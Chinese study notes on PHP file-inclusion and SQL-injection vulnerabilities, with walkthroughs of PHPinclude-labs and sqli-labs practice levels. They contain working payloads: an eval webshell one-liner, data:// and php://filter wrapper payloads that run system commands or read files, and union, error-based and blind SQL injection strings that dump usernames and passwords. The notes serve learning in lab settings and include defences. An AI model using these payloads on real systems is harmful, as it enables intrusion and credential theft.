# 文件包含-学习笔记

程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被称为文件包含。可以创建供所有网页引用的标准页眉或菜单文件。

通常会把被包含的文件设置为变量，进行动态调用，从而导致客户端可以调用任意文件，造成文件包含漏洞。

## 文件包含函数
### include()
假设我们有一个定义变量的包含文件,这些变量可用在调用文件中.

```
include 'filename';

vars.php:
<?php
$color='red';
$car='BMW';
?>

<?php 
include 'vars.php';
echo "I have a $color $car"; // I have a red BMW
?>
```

找不到被包含的文件时只产生警告 ，脚本将继续执行。(require则会停止运行)

包含文本文件时可以直接输出，如果静态储存则不能

![image](https://github.com/user-attachments/assets/b28695f4-a214-46ac-a2ce-35e1e37ec6b7)

### include_once()
此语句和 include() 语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。

![image](https://github.com/user-attachments/assets/0ee19351-1749-44b4-8012-d7394677e858)

### require()
找不到被包含的文件时会产生致命错误，并停止脚本

![2e72bba026f4a2f1ff6aa9264d131246](https://github.com/user-attachments/assets/8aacfe0d-d1e1-4961-94a5-821eaea42e51)

### require_once()
同include_once

文件包含的文件都会被解析为php

## 本地文件包含——日志文件包含
日志注入是通过插入恶意数据到应用程序的日志文件来实施的攻击。当这些日志被其他系统或应用程序读取和解析时，攻击者的恶意数据可能会被执行。这通常利用了不安全的日志处理机制和文件包含漏洞的组合。产生原因是 PHP 语言在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在服务器本地时，就形成的本地文件包含漏洞。

可以通过burpsuite将命令写入日志文件中，比如向日志文件中写入“phpinfo”

![image](https://github.com/user-attachments/assets/0a08e165-a4ba-4ca9-b597-3c2030a3b935)

![image](https://github.com/user-attachments/assets/f37a57ed-5062-42b3-8f59-44cd454e201d)

再次包含日志文件，phpinfo被解析

## 远程文件包含
如果PHP的配置选项allow_url_include、allow_url_fopen状态为ON的话，则include/require函数是可以加载远程文件的，这种漏洞被称为远程文件包含(RFI)

利用webshell（可以使用蚁剑构建）植入木马

![image](https://github.com/user-attachments/assets/e0304d2e-deb5-4635-bf19-c8f5796ff377)


## PHP伪协议
PHP伪协议是PHP自己支持的一种协议与封装协议，简单来说就是PHP定义的一种特殊访问资源的方法。

文件包含的时候，可能遇到的文件包含函数：
```
include
require
include_once
require_once
highlight_file
show_source
flie
readfile
file_get_contents
file_put_contents
fopen (比较常见)
```

php支持的协议和封装协议，可用于文件包含函数
```
file:// — 访问本地文件系统
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
zlib:// — 压缩流
data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档
ssh2:// — 安全外壳协议 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流
```

### file://
访问本地文件系统
file:///flag

### php://
访问各个输入/输出流（I/O streams），PHP中最为复杂和强大的协议

### php://filter
php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。简单通俗的说，这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程。

php://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致任意文件读取。

resource=<要过滤的数据流> 这个参数是必须的。它指定了你要筛选过滤的数据流。resource=flag.php
read=<读链的筛选列表> 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。php://filter/read=A|B|C/resource=flag.php
write=<写链的筛选列表> 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。php://filter/write=A|B|C/resource=flag.php
<;两个链的筛选列表> 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。php://filter/A|B|C/resource=flag.php

格式：
?变量名=filter/read=/resource=/flag

常用：
```
php://filter/x=A|B|C|/resouce=xxx
php://filter/read=convert.base64-encode/resource=index.php
php://filter/resource=index.php
```

利用filter协议读文件，将index.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。而使用的convert.base64-encode，就是一种过滤器。

### 字符串过滤器
用来处理所有的流数据，单纯的字符串过滤器如rot13变换解决不了php文件
用base64的转换滤器解决php文件
string.rot13 rot13变换
string.toupper 转大写字母
string.tolower 转小写字母
string.strip_tags 去除html、PHP语言标签 (本特性已自 PHP 7.3.0 起废弃)

### php://input
php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。

```
php://input + [POST DATA部分]
```

例如：
http://127.0.0.1/cmd.php?cmd=php://input
POST数据：<?php phpinfo()?>
注意：
当enctype="multipart/form-data"的时候 php://input` 是无效的

遇到file_get_contents()要想到用php://input绕过。

使用burp suite软件抓包使用php://input伪协议将一句话木马写入。将数据包发送后，观察到一句话木马被包含。

![8f2a2c31f092192a5f8856e44439a648](https://github.com/user-attachments/assets/c31f0095-4765-465f-8a42-abe0106f820e)

### data://
数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。
如果传入的数据是PHP代码，就会执行代码
简单来说就是data://text/plain+,<?php 命令;?>

text/html → 按 HTML 解析

image/png → 按 PNG 图片处理

text/plain → 视为纯文本，直接显示内容，不执行任何解析。

```
示例用法：
1、data://text/plain,
http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>
 
2、data://text/plain;base64,
http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b

data://text/plain,<?php phpinfo();?>
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+

Example #1 打印 data:// 的内容
<?php
// 打印 "I love PHP"
echo  file_get_contents ( 'data://text/plain;base64,SSBsb3ZlIFBIUAo=' );
?>

Example #2 获取媒体类型
<?php
$fp    =  fopen ( 'data://text/plain;base64,' ,  'r' );
$meta  =  stream_get_meta_data ( $fp );

// 打印 "text/plain"
echo  $meta [ 'mediatype' ];
?>
```

### http://
访问 HTTP(s) 网址
例如
```
https://raw.githubusercontent.com/ProbiusOfficial/PHPinclude-labs/main/RFI
```

## 文件包含漏洞的防御
PHP:配置php.ini关闭远程文件包含功能(allow_url_include = Off)

严格检查变量是否已经初始化。

建议假定所有输入都是可疑的，尝试对所有输入提交可能可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现../之类的目录跳转符。

严格检查include类的文件包含函数中的参数是否外界可控。

不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。

在发布应用程序之前测试所有已知的威胁。

路径限制：限制被包含的文件只能在某一文件夹内，一定要禁止目录跳转字符，如：“../”；

包含文件验证：验证被包含的文件是否是白名单中的一员；

尽量不要使用动态包含，可以在需要包含的页面固定写好，如：include("head.php");，不要把被包含的写成变量。

## 其他文件系统函数
PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。(类似于include函数)
比如 file_put_contents(), file_get_contents(), file(), readfile()

file_get_contents — 将整个文件读入一个字符串

file_put_contents — 将数据写入文件
和依次调用 fopen()，fwrite() 以及 fclose() 功能一样。
fopen — 打开文件或者 URL
fwrite — 写入文件（可安全用于二进制文件）
fclose — 关闭一个已打开的文件指针

# PHPinclude-labs
## Level 0
进入后发现源代码中含有include函数，同时界面有提示，backdoor.txt 内容为: <?php @eval($_POST['ctf']); ?>，含有危险的eval函数就可以操作一下

![QQ_1743090821722](https://github.com/user-attachments/assets/70aaf189-2c55-43b3-9aa1-2a8d18ed7126)

直接通过get方式访问backdoor.txt文件，并post一下system函数，通过ls查看目录

![image](https://github.com/user-attachments/assets/bdf3cb7c-db87-4b43-9748-f969e6805ac5)

直接使用cat查看flag目录下的文件，得到flag flag{TEST_Dynamic_FLAG}
![image](https://github.com/user-attachments/assets/803b39af-ecda-4257-8d86-2b694cb14f9a)

## Level 1
进入后提示使用file协议

![image](https://github.com/user-attachments/assets/4f2ada16-8d70-4d09-a4e3-b18c14cb43f6)

首先尝试直接访问，发现失败了，检索得知flag.php 中 flag以静态变量形式存储。由于并没有输出操作，它只会被加载到服务器或者说容器的内存中，这种形式的FLAG您无法通过单纯包含得到。所以无法通过flag.php文件获得。

![image](https://github.com/user-attachments/assets/383066b6-a138-416a-b87f-f36c3ca23a6a)

尝试访问根目录下文本形式的flag文件，得到flag

![image](https://github.com/user-attachments/assets/294cd057-d006-4b25-99e6-8c41d2372567)

## Level 2
这一关提示只能使用data协议

![image](https://github.com/user-attachments/assets/bd29f741-6b14-4c44-a5ac-b8ab47deb5f9)

先查看目录，直接访问，得到flag

![image](https://github.com/user-attachments/assets/3aa9da09-a40f-471f-9a5e-85fa2a785d20)

![image](https://github.com/user-attachments/assets/d17c6acc-c914-4545-ada1-ff3f724bc1d2)

## Level 3
这一关还是使用data协议，但是发现过滤掉了/flag|\~|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\-|\_|\+|\=|\

![image](https://github.com/user-attachments/assets/261fce22-6bad-45ea-81c3-d11745bb96a3)

可以通过Base64的输入形式进行绕过,直接将<?php system("cat /flag");?>编码

![image](https://github.com/user-attachments/assets/d4cea6c2-9216-4226-8cdb-cc75cd8b9bd2)

?wrappers=;base64,PD9waHAgc3lzdGVtKCJjYXQgL2ZsYWciKTs/Pg，得到flag

![image](https://github.com/user-attachments/assets/4ded4c59-932f-495f-93d9-b744447e3d9b)

## Level 4
进入后提示本关卡只能使用http/https 协议

![image](https://github.com/user-attachments/assets/0970147e-42b0-4cc9-a854-8a85b78de88c)

在大多数情况下，localhost 只是默认情况下引用 127.0.0.1 的简写，即本地主机.可以直接通过http/https 协议访问127.0.0.1/backdoor.txt（localhost/backdoor.txt也可以）

![image](https://github.com/user-attachments/assets/75553369-f2b7-4abd-8d00-1e34591ef513)

直接cat /flag即可

![image](https://github.com/user-attachments/assets/71b45716-5e18-45a7-a325-da7bcd2f8ace)

## Level 5
这一关还是使用http/https 协议，提示访问challenge.txt

![image](https://github.com/user-attachments/assets/155ae9c5-5469-4fdf-a590-a4245dc2d84f)

访问失败了，说明当前目录在不再有后门文件了,可以考虑使用远程文件包含

![image](https://github.com/user-attachments/assets/2dfaed63-799c-4970-8423-797f19e3286f)

尝试自己构建一个webshell但是不知道为什么没有运行,之后会用蚁剑再次尝试

这里直接使用作者的一句话木马进行远端包含，得到flag

![image](https://github.com/user-attachments/assets/f2dfc98e-26eb-46f6-8a65-22a70fc7a4a8)

## Level 6
这一关要求使用php://协议

![image](https://github.com/user-attachments/assets/9970b187-fcb8-46d7-9328-1b0fbca35e94)

这里选择用php://filter方式直接访问flag
php://filter/read=/resource=/flag

![image](https://github.com/user-attachments/assets/23bd4dd8-830f-4209-9d7f-5b7a0f1d28d5)

php://input没有成功

## Level 7
这一关要求用php://input
php://input作为include的直接参数时请求的参数格式是原生(Raw)的内容，无法使用hackbar提交，因为hackbar不支持raw方式
先访问php://input，先用bursuite打开代理

![image](https://github.com/user-attachments/assets/7d0314e5-2398-4612-bef4-7fe082318137)

发现抓完包里面是乱码，尝试失败了，php://input这个没有解出来，回头看一下大佬的

## Level 8
这一关要求使用php://filter，通过rot13变换访问flag.txt
?wrappers=filter/string.rot13/resource=/flag

![image](https://github.com/user-attachments/assets/abc44140-88fd-40ff-b757-900bd410a9b9)

## Level 9
本题也是php://filter，但是不存在文本格式的flag的了，只能用base64的转换滤器解决php文件

![image](https://github.com/user-attachments/assets/19326150-cf5e-45f6-af21-b025bfd6fe03)

之后进行解码即可得到flag

## Level 10
这道题使用file_get_contents() 函数，这个函数会将整个文件读入一个字符串,同样的他支持封装协议(wrappers)的使用
可以将这个看为include函数，然后直接输入?file=php://filter/string.rot13/resource=/flag

![image](https://github.com/user-attachments/assets/d6cb207f-ba7d-45f2-a3e4-bb175fd4aeba)

解码后即可得到flag

![image](https://github.com/user-attachments/assets/9d9025dc-10f8-4737-99e8-1db3de1e24fb)

## Level 11
这关考察_file_put_contents()函数，这将对应过滤器中的Write方法，用于将数据写入文件。

![image](https://github.com/user-attachments/assets/73fdee4c-9955-440a-bd94-285abe2e011d)

但是又失败了

# SQL注入-学习笔记
## SQL基础知识学习
SQL（Structured Query Language，结构化查询语言）是一种用于管理和操作关系型数据库的标准化编程语言。

SQL 通过一系列的语句和命令来执行数据定义、数据查询、数据操作和数据控制等功能,包括数据插入、查询、更新和删除，数据库模式创建和修改，以及数据访问控制。(即SQL是一种数据库查询语言）

要创建一个显示数据库中数据的网站需要：
RDBMS 数据库程序（比如 MS Access、SQL Server、MySQL） ——SQL的基础
使用服务器端脚本语言，比如 PHP 或 ASP
使用 SQL 来获取您想要的数据
使用 HTML / CSS

整体学下来感觉有点像Excel（笑哭）

### SQL语法
数据库表：一个数据库通常包含一个或多个表，每个表有一个名字标识（例如:"Websites"），表包含带有数据的记录（行）。

```
+----+--------------+---------------------------+-------+---------+
| id | name         | url                       | alexa | country |
+----+--------------+---------------------------+-------+---------+
| 1  | Google       | https://www.google.cm/    | 1     | USA     |
| 2  | 淘宝          | https://www.taobao.com/   | 13    | CN      |
| 3  | 菜鸟教程      | http://www.runoob.com/    | 4689  | CN      |
| 4  | 微博          | http://weibo.com/         | 20    | CN      |
| 5  | Facebook     | https://www.facebook.com/ | 3     | USA     |
+----+--------------+---------------------------+-------+---------+
```

数据库为层级结构

如：在RUNOOB 数据库中创建了 Websites 表
use RUNOOB; 命令用于选择数据库。
set names utf8; 命令用于设置使用的字符集。
SELECT * FROM Websites; 读取数据表的信息。

SQL语句：
SQL 对大小写不敏感：SELECT 与 select 是相同的。

SELECT - 从数据库中查询数据
```
SELECT 列名1, 列名2, ... FROM 表名 WHERE 条件
SELECT DISTINCT 用于返回唯一不同的值，去掉同一列中相同的值

SELECT column_name(s) 要查询的列
FROM table_name 要查询的表
WHERE condition 查询条件（可选）用来筛选某一列的值为xxx的所有数据
ORDER BY column_name [ASC|DESC] 排序方式，ASC 表示升序，DESC 表示降序（可选）
```
SELECT * 选取所有列

INSERT INTO - 用于向数据库表中插入新数据。一般插入一整行新的数据
```
INSERT INTO table_name (column1, column2, ...) 要插入数据的表(列)
VALUES (value1, value2, ...) 对应列的值

如（id列不用插入）
INSERT INTO Websites (name, url, alexa, country)
VALUES ('百度','https://www.baidu.com/','4','CN');
```

UPDATE - 更新数据库中的数据
```
UPDATE table_name 要更新数据的表
SET column1 = value1, column2 = value2, ... 要更新的列及其新值
WHERE condition 更新条件

如
UPDATE Websites 
SET alexa='5000', country='USA' 
WHERE name='菜鸟教程';
（一定不要省略where子句，否则会将 Websites 表中所有数据的 alexa 改为 5000，country 改为 US）
```

DELETE - 从数据库中删除数据
```
DELETE FROM table_name 要删除数据的表
WHERE condition 删除条件

如
DELETE FROM Websites
WHERE name='Facebook' AND country='USA';

DELETE FROM table_name; 不删除表的情况下，删除表中所有的行
```

CREATE TABLE：用于创建新的数据库表
```
CREATE TABLE table_name ( 要创建的表名
    column1 data_type constraint, 表的列、列的数据类型、列的约束
    column2 data_type constraint,
    ...
)
```

CREATE DATABASE - 创建新数据库

ALTER TABLE：用于修改现有数据库表的结构
```
ALTER TABLE table_name 要修改的表
ADD column_name data_type 要添加的列 列的数据类型
（DROP COLUMN column_name 要删除的列）
```

ALTER DATABASE - 修改数据库

DROP TABLE：用于删除数据库表
```
DROP TABLE table_name
```

CREATE INDEX - 创建索引（搜索键）
```
CREATE INDEX index_name 索引的名称
ON table_name (column_name) 要索引的列
```

DROP INDEX - 删除索引
```
DROP INDEX index_name 要删除的索引名称
ON table_name 索引所在的表
```

WHERE：用于指定筛选条件(如SELECT * FROM Websites WHERE country='CN';)
ORDER BY：用于对结果集进行排序
GROUP BY：用于将结果集按一列或多列进行分组
HAVING：用于对分组后的结果集进行筛选
JOIN：用于将两个或多个表的记录结合起来
DISTINCT：用于返回唯一不同的值

AND & OR 运算符用于基于一个以上的条件对记录进行过滤。
AND 表并列，需要同时满足；OR 表选择，满足一个即可
如
```
SELECT * FROM Websites
WHERE country='CN'
AND alexa > 50;

SELECT * FROM Websites
WHERE country='USA'
OR country='CN';

或者结合在一起
AND (country='CN' OR country='USA');
```

UNION
合并两个或多个 SELECT 语句的结果，每个 SELECT 语句必须具有相同数量的列，且对应列的数据类型必须相似
注意区分UNION ALL，UNION去掉了相同的部分，UNION ALL则是直接合并
```
SELECT column1, column2, ...
FROM table1
UNION
SELECT column1, column2, ...
FROM table2;
![image](https://github.com/user-attachments/assets/9dd6fe43-0aca-4126-956f-8c82b21c538a)

SELECT column1, column2, ...
FROM table1
UNION ALL
SELECT column1, column2, ...
FROM table2;
![image](https://github.com/user-attachments/assets/8b554d94-3cca-4a02-83ba-6388a9b395e3)
```

LIMIT
限制查询结果返回的记录数量
limit N : 返回 N 条记录
offset M : 跳过 M 条记录, 默认 M=0, 单独使用似乎不起作用
limit N,M : 相当于 limit M offset N , 从第 N 条记录开始, 返回 M 条记录(LIMIT n 等价于 LIMIT 0,n)
```
返回表中前number行数据 SELECT column1, column2, ... FROM table_name LIMIT number
从offset+1行开始返回row_count行数据 SELECT column1, column2, ... FROM table_name LIMIT offset, row_count
LIMIT 10, 10 返回11-20行数据
```

GROUP BY 
用于结合聚合函数，根据一个或多个列对结果集进行分组。

## SQL注入
一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。

简单来说，就是 构造语句查询信息。

### 注入分类
按输入的参数分为 数字型注入（输入整型参数）、字符型注入（输入字符串）
按注入的方法分为 Union注入、报错注入、时间注入

### Union注入--字符型注入
#### 注入点
指可以实行注入的地方，通常是访问数据库的连接，比如说get_post提交

#### 判断是哪种注入
提交字符一定是字符型，提交数字不一定是数字型
可以使用?id=1 and 1=1和?id=1 and 1=2判断

如果1=1页面显示正常和原页面一样，并且1=2页面报错或者页面部分数据显示不正常，那么可以确定此处为数字型注入

如果1=1页面显示正常和原页面一样，并且1=2页面报错或者页面部分数据显示不正常，那么可以确定此处为字符型注入

还有一个很巧的方法，如果提交2-1和提交1的结果一样时，则为数字型注入（可以做运算，用-不用+）；如果提交2-1和提交2结果一样时，则为字符型注入

#### 构造闭合
字符型需要闭合符如id='$id'，数字型不需要闭合符如id=$id
闭合方式：'   "  ')  ")
$id, '$id', "$id", ($id)

**判断闭合方式：**
MYSQL数据库的包容性比较强，如果你输错了数据的类型，MYSQL数据库会自动将其转换成正确的数据类型，比如输入1)、1"、1-等，只要数字后面的字符不是闭合符的，数据库都会把你输入的错误的数据转换成正确的数据类型。

例如：在Mysql数据库下，代码如下：
```
$id=$_GET[‘id’];
$sql=“SELECT * FROM name WHERE id=’$id’ LIMIT 0,1”;
```
如果输入id=1)则不会报错，如果id输入1'则会报错

大多数情况下，SQL 注入都是黑盒，我们不知道后台到底是怎么写的，所以我们需要一些判断的方法或者技巧

![QQ_1743235028497](https://github.com/user-attachments/assets/82e62199-9d98-4228-a074-4e4bba658276)

![QQ_1743235234198](https://github.com/user-attachments/assets/c2dee42d-7eeb-437e-a37c-0c7388b0c6d4)

```
法一：
输入id=1\ 分析报错信息：看\斜杠后面跟着的字符，是什么字符，它的闭合字符就是什么，若是没有，就为数字型。

![image](https://github.com/user-attachments/assets/77a51910-8fbb-4df2-b8d6-9d1c7b5f704d)

![image](https://github.com/user-attachments/assets/1432f740-0291-4a86-810b-afa0cc3b45c8)

法二：
首先尝试：
?id=1’
?id=1”
结果一：如果都报错
判断闭合符为：整形闭合。

结果二：如果单引号报错，双引号不报错。
继续尝试
?id=1’ –-+
结果1：无报错
判断闭合符为：单引号闭合。
结果2：报错
判断闭合符可能为：单引号加括号。

结果三：如果单引号不报错，双引号报错。
继续尝试
?id=1" -–+
结果1：结果无报错
判断闭合符为：双引号闭合。
结果2：报错
判断闭合符可能为：双引号加括号。
```

**闭合的作用：**
手工提交闭合符号，结束前一段查询语句
后面即可加入其他语句，查询需要的参数
不需要的语句可以用注释符号‘+’或#或’%23’注释掉
我们通常在构造完闭合后去注释掉后面的符号
比如使用 # 或 --+ 或 %23

#### 判断列数
1. 用group by二分法判断默认页面数据列数量（order by也可以）
如?id=1' group by 4--+会报错
?id=1' group by 3--+不会，可以确定有三列
2. 找到回显位，用union联合注入（需要保证前后列数一致）
页面只能显示一个内容，第二句内容是不显示的，可以把第一句内容改为数据库不存在的数据
?id=-1' union select 1,2,3（所有的列数)--+ 可以去掉第一行回显出1,2,3
?id=-1' union select 1,2,database()【查询数据库名字】--+
?id=-1' union select 1,version(),database()

#### 总结
1、查找注入点

2、判断是字符型还是数字型注入and 1=1 1=2/ 3-1

3、如果字符型，找到他的闭合方式，「"./）")

4、判断查询列数，group by或order by

5、查询回显位置，-1

#### 拿到表名和列名
information_schema() --库名

包含所有mysql数据库的简要信息，其中包含tables（表名集合表）和columns（列名集合表）

tables --表名

table_name --数据列

table_schema 是数据库的名称，找到security的行

table_name 是具体的表名。

table_type 表的类型。


group_concat()

确保所有查询信息（所有表）能放到一行显示出来

id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()[即'security']--+

查找数据库security中数据表users的列名

id=0' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users'--+

或者

id=0' union select 1,(需要查询的信息),3--+

#### 查询最终目标
id=0' union select 1,group_concat(username,'~',password),3 from users--+
~用来区分数据

### Union注入--数字型注入
1. 确定数字型还是字符型

2. 使用group by的二分法判断union语句中前一个查询的列数

3. 优化语句，将id改为一个不存在的数字

4. 使用select语句，查询靶机数据库库名

5. 使用select语句，查询靶机所有表名

6. 使用select语句，查询靶机所有列名

7. 查询所有用户名密码

### 报错注入
通过报错信息获取数据的方法。

用户在前台页面输入检索内容，后台将前台页面上输入的检索内容无加区别的拼接成sql语句，送给数据库执行。数据库将执行的结果返回给后台，后台将数据库执行的结果无加区别的显示到前台页面上。

后台对于输入输出的合理性没有做检查（两个无加区别）

即构造语句，让错误信息中可以显示数据库内容的查询语句，返回报错提示中包含数据库的内容

#### extractValue()
函数extractValue()包含两个参数 第一个 XML文档对象名称  第二个 路径
```
EXTRACTVALUE(xml_target, xpath_expr)

如
select extractvalue(doc,'/book/title') from xml;
```

其中xml对象对象名称不重要，可以随便填

关键是将路径前的'/'换为'~'，可以实现报错，显示报错信息，对路径进行修改后，获得我们想要的信息

```
select extractvalue(doc,'~book/title') from xml;
```
这里的~可以写作ascll编码的0x7e，同时修改路径
concat就是将两个内容拼接在一起
```
select extractvalue(doc,concat(0x7e,(select database()))) from xml;
```


在题目中，获得库名

?id=2' union select 1,extractvalue(1,concat(0x7e,(select database()))),3--+

简写为

?id=2' and 1=extractvalue(1,concat(0x7e,(select database())))--+


获得表名

?id=2' and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+


获得列名

?id=2' and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users')))--+


获得结果

?id=2' and 1=extractvalue(1,concat(0x7e,(select group_concat(username,'~',password)from users)))--+

但是extractvalue()回显默认只有32个字符串


需要使用函数substring()解决三个参数分别为：字符串、从第几个开始返回、返回几个
```
select substring(123456,1,3)
返回 123

select substring(123456,4,3)
返回 456
```


将substring()加入(或者substr())，不断修改第二个参数的值去搜索结果
?id=2' and 1=extractvalue(1,concat(0x7e,substring((select group_concat(username,'~',password)from users),1,30)))--+

#### updatexml() 
```
updatexml(xml_document,xpath_string,new_value)
```
第一个参数为 xml文档对象名称

第二个参数为 路径（主要作用）

第三个参数为 替换查找到的符合条件的数据


报错原理同extractvalue()，输入错误的第二个参数
?id=1" and 1=updatexml(1,concat(0x7e,(select database())),3)--+


其它流程同extractvalue

#### floor()
涉及函数：
```
rand()
floor()
concat_ws()
group by
as
count()
limit
```

### 盲注
盲注是指攻击者不能直接获取数据库中的信息，需要通过一些技巧来判断或推断出数据库中的数据。盲注主要分为布尔盲注、时间盲注、报错盲注

#### 布尔盲注（通法，一个一个字母硬试出来）
web页面只返回true真和false假两种类型，利用页面返回不同，逐个猜解数据

如在sqli-lab less8中


如果输入id = 1' and 1=1--+ 会返回you are in 代表为真值

![image](https://github.com/user-attachments/assets/d0a6c621-30b2-44e2-a175-49dc9c272faf)


如果输入id = 1' and 1=2--+ 不会返回 代表为假值

![image](https://github.com/user-attachments/assets/7523b6dc-e426-4b43-a1d8-a8c323e87649)


只要能使页面出现真假两种情况就能用布尔盲注

**关键函数**
ascii()

将字母转换成对应数字，查询命令可以执行但不会返回信息

可以使用ascii()把查询到的内容转换成数字，以真假页面来判断字母和其对应的数字是否正确

但是ascii()只能转换第一个字母

所以需要借助函数**substr()**  函数substr((),2,1)从第2个字符开始，显示1个字符（注意有两个括号）

?id=1' and ascii(substr((select database()),1,1))=101 --+

?id=1' and ascii(substr((select database()),1,1))>=101 --+

条件满足，页面显示为真true

使用 **length()**获取长度信息

用?id=1' and (length(database()))>=8--+ 来判断名字的长度

其它步骤可以参考union注入

不同的地方是

?id=1' and ascii(substr((select table_name from information_schema.tables where
table_schema=database() limit 0,1),1,1))>100 --+

此处没必要使用group_concat()函数，而是使用**limit 0,1**

这个函数的意思是从第0行开始显示1行，从结果的第一行数据依次查询。（同样是改第二个数据）

还有对闭合符的判断

![QQ_1743527662818](https://github.com/user-attachments/assets/289b79f6-f358-4f82-8c0a-2fc4bb8421c9)

#### 时间盲注
web页面只返回一个正常页面。利用页面相应时间不同，逐个猜解数据

前提是数据库会执行命令代码，只是不反馈页面信息

**关键函数：**

**sleep()**

函数sleep()参数为休眠时长，以秒为单位，可以为小数

(开发者工具中可以查询响应时间)

![image](https://github.com/user-attachments/assets/517b688a-430a-4c2a-b86b-e23dd9d583de)

通过and连接sleep(3)

如输入?id=1 and sleep(3)--+如果耗时3s则代表为数字型注入，反之为字符型

如输入?id=1' and sleep(3)--+如果耗时3s则代表为'闭合，反之则不是

**if()**

select if(a,sleep(0),sleep(3))

意思是如果a为真，则响应0秒钟；如果a为假，则响应3秒钟

结合布尔盲注，可以写出以下指令

?id=1' and if(length(select database())>5,sleep(0),sleep(3))--+

?id=1' and if(ascii(substr((select database()),1,1))>100,sleep(0),sleep(3))--+

...

# sqli_labs
## Less-1
进入页面后提示为id赋值

![image](https://github.com/user-attachments/assets/6504e927-2df9-4e51-b334-abc876dc70a3)

为id赋值2，得到对应的查询数据，这就是注入点

![image](https://github.com/user-attachments/assets/56ce2bde-4799-4cfb-901c-3d1921143dae)

接着判断是字符型还是数字型注入，令id=2-1，发现没有变化，所以是字符型注入

![image](https://github.com/user-attachments/assets/377693ff-f548-46bb-a8d2-61f921148a6c)

接着去找闭合方式，根据报错信息可知是单引号闭合

![image](https://github.com/user-attachments/assets/4ed1eb5d-bd8c-4666-b7cb-8f6c5572e1e4)

![image](https://github.com/user-attachments/assets/e848c95d-cb17-4825-a312-58783409aed2)

接着判断查询列数，得到是三列

![image](https://github.com/user-attachments/assets/01f26280-a623-4919-b621-b41041b43211)

![image](https://github.com/user-attachments/assets/6783c760-5050-4a77-bbb2-3df30015559a)

接着查询回显位置，并获得当前版本号和数据库名

![image](https://github.com/user-attachments/assets/272d4cc4-12aa-4661-9c29-fede8f3d47da)

![image](https://github.com/user-attachments/assets/b46db9fc-8223-49fe-9ef8-eabbaa6481a4)

然后去拿表名，得到users这个表名

![image](https://github.com/user-attachments/assets/a26a6c74-1274-46a1-aa43-ac5b9f97f896)

然后查找数据库security中数据表users的列名

![image](https://github.com/user-attachments/assets/5d9ddcfd-fa5e-436d-9473-3f30ef847600)

得到列名后就可以去查询最终目标，得到dhakkan~dumbo,即id=12时的位置

![image](https://github.com/user-attachments/assets/fcfe78e9-bb98-4113-9fc7-4fedc7478ba9)

![image](https://github.com/user-attachments/assets/eb6efc7b-4a40-4d4b-aa22-125327d35df5)

## Less-2
进入后先判断是哪种类型的注入，可知是数字型

![image](https://github.com/user-attachments/assets/523c4408-83a9-4967-b92b-abead00ea42b)

![image](https://github.com/user-attachments/assets/5df0b58b-3677-4551-a44d-5ddf1c1539c5)

判断列数，得到是3列

![image](https://github.com/user-attachments/assets/8d21dd1d-5ea1-4a2d-93a3-78cc36397b10)

找到回显位置，获得数据库的名字

![image](https://github.com/user-attachments/assets/d1b8d592-6c5f-4409-8a32-f4d555e6a262)

![image](https://github.com/user-attachments/assets/73827868-19e1-4858-a6d4-bb0d49764cae)

拿到表名

![image](https://github.com/user-attachments/assets/2d5beb7e-56c0-4def-a84a-e947c512e67a)

拿到列名

![image](https://github.com/user-attachments/assets/13ee7680-f47f-48e1-820e-e704b8640fc5)

查询结果

![image](https://github.com/user-attachments/assets/2cceb394-e6d4-451d-af65-b445eee8c3fa)

## Less-3
查询后发现此题是字符型，且以')闭合

![image](https://github.com/user-attachments/assets/aba9140e-7753-4154-b29e-a296d8f9601d)

其它步骤同lss1和lss2了

![image](https://github.com/user-attachments/assets/550db62e-a2c1-40a9-bf0c-1696d3b46abc)

![image](https://github.com/user-attachments/assets/e2005136-6e16-40e6-ad84-a32850f23ffc)

![image](https://github.com/user-attachments/assets/1604fbdd-a0a7-44ff-b15e-d4464d409407)

![image](https://github.com/user-attachments/assets/7d2bee5b-b390-42d7-a260-4c63418ab11b)

